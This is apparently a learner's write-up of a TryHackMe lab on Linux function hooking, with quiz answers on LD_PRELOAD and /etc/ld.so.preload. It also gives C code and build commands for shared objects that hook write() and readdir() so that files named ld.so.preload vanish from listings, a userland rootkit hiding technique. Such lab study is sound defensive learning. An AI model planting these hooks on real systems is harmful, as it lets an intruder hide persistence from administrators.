<h1 align="center"><a href="https://tryhackme.com/room/linuxfunctionhooking">Linux Function Hooking</a></h1>
<p align="center"><img width="1200px" src=""><br>
If you find it helpful, consider coming back for research.<br><p align="center"><a href="https://github.com/RosanaFSS"><img src="https://img.shields.io/github/followers/RosanaFSS?label=Follow&style=for-the-badge&logo=github&color=24292e" alt="Follow Rosana on GitHub"></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="https://img.shields.io/badge/COMPLETED-2026%2C%20FEV%207-444444?style=for-the-badge&logo=calendar-check" alt="Completion Date"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <a href="https://www.linkedin.com/in/rosanafssantos/"><img src="https://img.shields.io/badge/Connect-LinkedIn-0077B5?style=for-the-badge&logo=linkedin&logoColor=white" alt="Connect on LinkedIn"></a></p>


<h2>Task 1 . Introduction</h2>

<p><em>Answer the question below</em></p>

<p>1.1. <em>I am ready to learn!</em><br>
<code>No answer needed</code></p>

<br>
<h2>Task 2 . What are Shared Libraries?</h2>
<br>

<p><em>Answer the question below</em></p>

<p>2.1. <em>What is the name of the dynamic linker/loader on linux?</em><br>
<code>ld.so, ld-linux.so</code></p>

<img width="855" height="263" alt="image" src="https://github.com/user-attachments/assets/331ab115-4b9c-44e9-86cf-e1436bcd353b" />

<br>
<br>

<img width="1310" height="187" alt="image" src="https://github.com/user-attachments/assets/0efab443-c2fd-4908-814f-73e06f05a0b9" />

<br>
<br>
<br>
<h2>Task 3 . Getting Tad Bit Technical</h2>
<br>

<p><em>Answer the questions below</em></p>

<p>3.1. <em>What environment variable let's you load your own shared library before all others?</em><br>
<code>LD_PRELOAD</code></p>

<p>3.2. <em>Which file contains a whitespace-separated list of ELF shared objects to be loaded before running a program?</em><br>
<code>/etc/ld.so.preload</code></p>

<p>3.3. <em>If both the environment variable and the file are employed, the libraries specified by which would be loaded first?</em><br>
<code>Environment Variable</code></p>

<br>
<h2>Task 4 . Putting On Our Coding Hats</h2>
<br>

<p><em>Answer the questions below</em></p>

<p>4.1. <em>How many arguments does write() take?</em><br>
<code>L3</code></p>

<p>4.2. <em>Which feature test macro must be defined in order to obtain the  definitions  of RTLD_NEXT from <dlfcn.h>? </em><br>
<code>_GNU_SOURCE</code></p>

<p><em>helloworld.c</em></p>

```bash
#include <unistd.h>
int main()
{
	char str[13];
	int s;
	s=read(0, str, 13);
	write(1, str, s);
	return 0;
}
```

<p><em>malicious.c</em></p>

```bash
#include <stdio.h>
#include <unistd.h>
#include <dlfcn.h>
#include <string.h>
ssize_t write(int fildes, const void *buf, size_t nbytes)
{
     ssize_t (*new_write)(int fildes, const void *buf, size_t nbytes); 
     ssize_t result;
     new_write = dlsym(RTLD_NEXT, "write");
     if (strncmp(buf, "Hello World",strlen("Hello World")) == 0)
     {
          result = new_write(fildes, "Hacked 1337", strlen("Hacked 1337"));
     }
     else
     {
          result = new_write(fildes, buf, nbytes);
     }
     return result;
}
```

```bash
:~/LinuxFunctionHooking# ls
helloworld.c  malicious.c
```

```bash
:~/LinuxFunctionHooking# gcc helloworld.c -o helloworld
```

```bash
:~/LinuxFunctionHooking# ls
helloworld  helloworld.c  malicious.c
```


<br>
<h2>Task 5 . Let's Gooooooooo</h2>

<p><em>Answer the questions below</em></p>

<p>5.1. <em>When compiling our code to produce a Shared Object, which flag is used to create position independent code?</em><br>
<code>-fPIC</code></p>

<p>5.2. <em>Can hooking libc functions affect the behavior of Python3? (Yay/Nay)</em><br>
<code>Yay</code></p>

```bash
~/LinuxFunctionHooking# gcc malicious.c -fPIC -shared -D_GNU_SOURCE -o malicious.so -ldl
```

```bash
:~/LinuxFunctionHooking# LD_PRELOAD=./malicious.so ./helloworld
Hello World                
Hacked 1337
```

<img width="1118" height="158" alt="image" src="https://github.com/user-attachments/assets/5076908b-453f-44ac-bc2b-ec443fddbd55" />

<br>
<br>

<br>
<h2>Task 6 . Hiding Files From Is</h2>

<p><em>Answer the questions below</em></p>

<p>6.1. <em>There are two mandatory fields of a dirent structure. One is d_name, and the other one is?</em><br>
<code>d_ino</code></p>

<p>6.2. <em>I have read and understood how I can hide files using shared objects!</em><br>
<code>No answer needed</code></p>


<p><em>malicious.c</em></p>

```bash
#include <string.h>
#include <stdlib.h>
#include <dirent.h>
#include <dlfcn.h>
#include <fcntl.h>

#define FILENAME "ld.so.preload"

struct dirent *readdir(DIR *dirp)
{
     struct dirent *(*old_readdir)(DIR *dir);     
     old_readdir = dlsym(RTLD_NEXT, "readdir");
     struct dirent *dir;
     while (dir = old_readdir(dirp))
     {
           if(strstr(dir->d_name,FILENAME) == 0) break;     
     }
     return dir;
}

struct dirent64 *readdir64(DIR *dirp)
{
     struct dirent64 *(*old_readdir64)(DIR *dir);     
     old_readdir64 = dlsym(RTLD_NEXT, "readdir64");
     struct dirent64 *dir;
     while (dir = old_readdir64(dirp))
     {
           if(strstr(dir->d_name,FILENAME) == 0) break;
     }
     return dir;
}
```


```bash
gcc malicious.c -fPIC -shared -D_GNU_SOURCE -o malicious.so -ldl
```


<br>
<br>
<h1 align="center">In Progress</h1>


